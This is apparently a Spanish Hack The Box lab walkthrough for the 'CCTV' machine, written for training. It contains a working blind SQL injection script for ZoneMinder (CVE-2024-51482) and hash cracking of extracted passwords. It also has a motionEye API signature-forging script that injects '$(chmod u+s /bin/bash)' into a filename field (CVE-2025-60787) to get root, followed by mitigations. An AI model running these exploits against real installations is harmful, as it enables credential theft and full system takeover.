---
title: "HTB Walkthrough: CCTV"
date: 2026-06-22
draft: false
description: "Walkthrough completo de la máquina CCTV de Hack The Box. Dificultad Medium, OS Linux. SQL Injection ciega en ZoneMinder (CVE-2024-51482) para extraer hashes bcrypt, cracking offline, y escalada a root mediante falsificación de firma de API en motionEye (CVE-2025-60787) con inyección de comandos en nombre de fichero."
tags: ["HackTheBox", "Linux", "Medium", "SQLi", "BlindSQLi", "ZoneMinder", "CVE-2024-51482", "bcrypt", "JohnTheRipper", "motionEye", "CVE-2025-60787", "HMAC", "RCE", "SUID", "PrivEsc", "cctv", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **CCTV** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux**. ZoneMinder expuesto con credenciales por defecto es vulnerable al **CVE-2024-51482**, una SQL Injection ciega que nos permite extraer hashes bcrypt y obtener acceso SSH. Una vez dentro, motionEye corre como root con su clave de firma de API expuesta en un fichero de configuración legible — combinación que explota el **CVE-2025-60787** para inyectar un comando en el nombre de fichero de captura y obtener SUID en `/bin/bash`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                       |
|----------------|-----------------------------------------------------------------------------------------------|
| **Nombre**     | CCTV                                                                                          |
| **OS**         | Linux                                                                                         |
| **Dificultad** | Medium                                                                                        |
| **IP**         | 10.129.244.156                                                                                |
| **Técnicas**   | CVE-2024-51482 · Boolean-based Blind SQLi · bcrypt Cracking · CVE-2025-60787 · SUID PrivEsc  |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.244.156
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
echo "10.129.244.156 cctv.htb" >> /etc/hosts
```

> **💡 Superficie de ataque:** Solo SSH y un servicio web. Toda la investigación inicial pasa necesariamente por la aplicación web en el puerto 80.

---

## 2. Enumeración Web — ZoneMinder

Al visitar `http://cctv.htb` encontramos un panel de staff login. Probamos credenciales por defecto:

```
admin : admin
```

✅ Acceso concedido. La aplicación es **ZoneMinder v1.37.63**, un sistema de videovigilancia de código abierto.

> **⚠️ Vulnerabilidad identificada:** Esta versión es vulnerable a **CVE-2024-51482**, una SQL Injection ciega en el parámetro `tid` del endpoint `web/ajax/event.php`. Cualquier usuario autenticado — incluyendo `admin:admin` por defecto — puede explotarla.

Probamos primero el exploit público de referencia basado en time-based SQLi:

```bash
python3 CVE-2024-51482.py -i 10.129.244.156 -u admin -p admin --test
```

```
[-] Target does not appear vulnerable
```

El servidor amortigua los retardos de `SLEEP()`, así que la detección time-based falla. Sin embargo, el parámetro `tid` sigue sin sanitizar — cambiamos el enfoque a **boolean-based blind SQLi**: en lugar de medir tiempos, observamos si la clave `"response"` aparece o no en el JSON de respuesta según si la condición inyectada es verdadera o falsa.

### 2.1 Petición Vulnerable

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=<PAYLOAD>
Cookie: ZMSESSID=<cookie_de_sesión>
```

### 2.2 Lógica del Payload

```sql
-- ¿El primer carácter del hash de la contraseña de mark es '$' (ASCII 36)?
0 UNION SELECT 1,2,3,4 FROM Users WHERE Id=2 AND ASCII(SUBSTRING(Password,1,1))=36
```

Si la condición es verdadera, la respuesta cambia de forma detectable. Iterando posición a posición y carácter a carácter extraemos el hash completo sin retardos de tiempo.

### 2.3 Script de Extracción

```python
import requests, sys

URL    = 'http://cctv.htb/zm/index.php'
COOKIE = {'ZMSESSID': sys.argv[1]}
# Charset optimizado para bcrypt ($2y$10$...)
CHARSET = [ord(c) for c in '$2abcdefghijklmnopqrstuvwxyz0123456789./ABCDEFGHIJKLMNOPQRSTUVWXYZ']

def check(user_id, pos, asc_val):
    payload = (
        f'0 UNION SELECT 1,2,3,4 FROM Users '
        f'WHERE Id={user_id} AND ASCII(SUBSTRING(Password,{pos},1))={asc_val}'
    )
    params = {'view':'request','request':'event','action':'removetag','tid':payload}
    r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
    return '"response"' not in r.text and r.status_code == 200

for uid, uname in [(1,'superadmin'),(2,'mark')]:
    password = ''
    for pos in range(1, 61):
        found = False
        for asc in CHARSET:
            if check(uid, pos, asc):
                password += chr(asc); found = True; break
        if not found:
            for asc in range(32, 127):
                if check(uid, pos, asc):
                    password += chr(asc); found = True; break
        if not found: password += '?'
    print(f'{uname} hash: {password}')
```

El charset prioriza los caracteres típicos de un hash bcrypt (`$`, dígitos, letras y `./`) para reducir el número de peticiones necesarias por posición.

Extraemos el `ZMSESSID` de la sesión autenticada y ejecutamos:

```bash
python3 sqli.py jalvld8p48s3gpba63pb8gi3ho
```

```
superadmin hash: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark hash:       $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```

---

## 3. Cracking del Hash y Acceso SSH

Guardamos el hash de `mark` y lo crackeamos con John the Ripper:

```bash
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.hash
john --wordlist=/usr/share/wordlists/rockyou.txt mark.hash
```

```
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes

opensesame       (?)

1g 0:00:01:06 DONE — 0.01503g/s 89.82p/s
```

> **🔑 Credenciales obtenidas:** `mark:opensesame`

```bash
ssh mark@cctv.htb
```

```bash
mark@cctv:~$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
```

---

## 4. User Flag

```bash
mark@cctv:~$ cat /home/sa_mark/user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 5. Escalada de Privilegios — motionEye como Root

### 5.1 Enumeración de Servicios Locales

```bash
mark@cctv:~$ ss -tlnp
```

```
LISTEN  127.0.0.1:7999
LISTEN  127.0.0.1:8765
LISTEN  127.0.0.1:8554
LISTEN  127.0.0.1:3306
LISTEN  0.0.0.0:22
LISTEN  *:80
```

```bash
mark@cctv:~$ grep User /etc/systemd/system/motioneye.service
User=root
```

> **💡 Hallazgo clave:** **motionEye** (puertos `7999` y `8765`) se ejecuta como **root**. Si conseguimos ejecutar código a través de él, la escalada es directa.

### 5.2 Clave de Firma Expuesta en la Configuración

```bash
mark@cctv:~$ cat /etc/motioneye/motion.conf
```

```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @normal_username user
# @normal_password
setup_mode off
webcontrol_port 7999
webcontrol_localhost on
```

> **💡 Dato crítico:** `admin_password` no es la contraseña en texto plano — es el hash que motionEye usa como **clave de firma HMAC** para autenticar peticiones a su API REST. Cada petición debe incluir un parámetro `_signature` calculado con esa clave. Como `mark` puede leer este fichero, tenemos la clave sin necesidad de las credenciales reales. Esta es la base del **CVE-2025-60787**.

---

## 6. Explotación — CVE-2025-60787: Firma Falsificada + RCE vía Nombre de Fichero

### 6.1 Análisis de la Vulnerabilidad

CVE-2025-60787 combina dos problemas en motionEye:

1. **Clave de firma legible por usuarios no administrativos:** Con acceso a `motion.conf`, cualquier usuario local puede firmar peticiones arbitrarias a la API administrativa sin conocer la contraseña real.

2. **Inyección de comandos en `image_file_name`:** El campo que define el nombre de las capturas de cámara soporta plantillas tipo strftime (`%Y-%m-%d`), pero no sanea el contenido `$(...)`. Cuando motion genera el nombre de archivo a través de un shell, cualquier subcomando embebido se ejecuta — y como el servicio corre como root, el comando se ejecuta con privilegios de root.

```
Flujo normal:    image_file_name = "capture_%Y-%m-%d" → motion genera "capture_2026-06-22"
Flujo malicioso: image_file_name = "$(chmod u+s /bin/bash).%Y-%m-%d"
                 → motion invoca shell para expandir la plantilla
                 → subcomando ejecutado como root → /bin/bash obtiene bit SUID
```

### 6.2 Cálculo de la Firma

motionEye firma las peticiones concatenando método HTTP, ruta normalizada, cuerpo y clave, y calculando SHA-1 sobre el resultado. Reproducimos el algoritmo exacto:

```python
import hashlib, re, urllib.parse, requests, json

_SIGNATURE_REGEX = re.compile(r"[^a-zA-Z0-9/?_.=&{}\[\]\":, -]")
KEY  = "989c5a8ee87a0e9521ec81a79187d162109282f0"
BASE = "http://127.0.0.1:8765"

def compute_sig(method, path_with_query, body=""):
    parts = list(urllib.parse.urlsplit(path_with_query))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True)
             if q[0] != "_signature"]
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    parts[0] = parts[1] = ""
    parts[3] = "&".join([q[0] + "=" + q[1] for q in query])
    path     = _SIGNATURE_REGEX.sub("-", urllib.parse.urlunsplit(parts))
    k        = _SIGNATURE_REGEX.sub("-", KEY)
    body_str = _SIGNATURE_REGEX.sub("-", body) if body else ""
    return hashlib.sha1(f"{method}:{path}:{body_str}:{k}".encode()).hexdigest().lower()
```

### 6.3 Ejecución del Exploit

**Paso 1 — Leer la configuración actual de la cámara** (necesaria para el `set`, que requiere el objeto completo):

```python
qget = "/config/1/get?_username=admin"
r    = requests.get(f"{BASE}{qget}&_signature={compute_sig('GET', qget)}")
ui   = r.json()
```

**Paso 2 — Inyectar el payload en `image_file_name`:**

```python
ui["image_file_name"] = "$(chmod u+s /bin/bash).%Y-%m-%d"
ui["capture_mode"]    = "all-frames"
ui["still_images"]    = True
```

Activar `all-frames` fuerza a motion a generar capturas de forma continua, garantizando que el nombre de archivo malicioso se evalúe pronto.

**Paso 3 — Enviar la configuración envenenada:**

```python
body = json.dumps(ui)
qset = "/config/1/set?_username=admin"
r    = requests.post(
    f"{BASE}{qset}&_signature={compute_sig('POST', qset, body)}",
    data=body,
    headers={"Content-Type": "application/json"}
)
print(f"[*] Config update: {r.status_code} — {r.text}")
```

```bash
mark@cctv:/tmp$ python3 exploit.py
[*] Config update: 200 — {"reload": false, "reboot": false, "error": null}
```

Tras el reinicio del servicio `motion`, el subcomando se ejecuta como root y `/bin/bash` queda con SUID:

```bash
mark@cctv:/tmp$ /bin/bash -p
bash-5.2# id
uid=1000(mark) gid=1000(mark) euid=0(root) groups=1000(mark)
```

✅ **Shell con EUID 0 (root) obtenida.**

---

## 7. Root Flag

```bash
bash-5.2# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 8. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Puerto 80 con ZoneMinder v1.37.63; credenciales por defecto `admin:admin`.
2. **CVE-2024-51482** → Boolean-based blind SQLi en `tid` → hashes bcrypt de `superadmin` y `mark`.
3. **Cracking** → John + rockyou.txt → `mark:opensesame` → SSH.
4. **Enumeración local** → motionEye en puertos 7999/8765 corriendo como root; `motion.conf` legible con clave de firma expuesta.
5. **CVE-2025-60787** → Firma HMAC falsificada + inyección `$(...)` en `image_file_name` → `chmod u+s /bin/bash` ejecutado como root.
6. **Flags** → User flag en `/home/sa_mark/user.txt`; root flag con `/bin/bash -p`.

**Lo que aprendí con esta máquina:**

- **Las credenciales por defecto siguen siendo el vector de entrada más frecuente y más ignorado.** ZoneMinder se instala con `admin:admin` y muchas instancias en producción nunca lo cambian. Sin esas credenciales, la SQLi del CVE-2024-51482 no es explotable (requiere estar autenticado) — el hardening más básico habría cortado el ataque en el primer paso.

- **Time-based SQLi y boolean-based SQLi no son intercambiables.** Cuando el servidor amortigua los retardos (WAF, pooling de conexiones, configuración del motor), la detección por tiempo falla aunque la inyección exista. El cambio a boolean-based — observar diferencias en el contenido de la respuesta en lugar de en el tiempo — es el siguiente paso natural y funcionó perfectamente aquí.

- **Un fichero de configuración legible puede valer más que una contraseña.** La clave `admin_password` en `motion.conf` no era la contraseña del usuario — era la clave criptográfica de firma de toda la API. Tener acceso de lectura a ese fichero equivalía a tener acceso administrativo completo a motionEye sin conocer ninguna credencial real. El principio de mínimo privilegio sobre ficheros de configuración no es solo una buena práctica — es una línea de defensa concreta.

- **Los sistemas de templating que invocan un shell son un vector de inyección de comandos inmediato si no sanitizan la entrada.** `image_file_name` soportaba sustituciones de variables, lo que requiere invocar un shell para expandirlas. Cualquier campo que pase por un shell sin sanitizar `$()` es potencialmente vulnerable. La corrección no es sanitizar mejor — es no invocar un shell para expandir plantillas cuando no es estrictamente necesario.

- **Un servicio corriendo como root con capacidad de escritura en el sistema de ficheros es una escalada inmediata.** El SUID en `/bin/bash` es uno de los payloads más simples posibles — no requiere exploits de kernel, no depende de la arquitectura, y funciona mientras `/bin/bash` exista. El problema raíz no es el payload sino que motion corre como root innecesariamente.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Credenciales por defecto en ZoneMinder | Forzar cambio en el primer inicio de sesión; eliminar credenciales por defecto antes de exponer el panel |
| CVE-2024-51482 — SQLi ciega en `tid` | Actualizar ZoneMinder a versión parcheada; usar prepared statements en todos los endpoints AJAX |
| Clave de firma legible por usuarios no administrativos | Restringir permisos de `motion.conf` a solo `root`; no derivar claves de firma de la contraseña de administrador |
| motionEye ejecutándose como root | Ejecutar con un usuario dedicado sin privilegios; usar `setcap` si se necesita acceso a dispositivos de cámara |
| CVE-2025-60787 — inyección vía `image_file_name` | Actualizar motionEye a versión parcheada; no expandir plantillas de nombre de fichero mediante un shell |
| Ausencia de segmentación entre servicios y privilegios root | Auditar periódicamente qué servicios locales corren con privilegios elevados innecesarios |
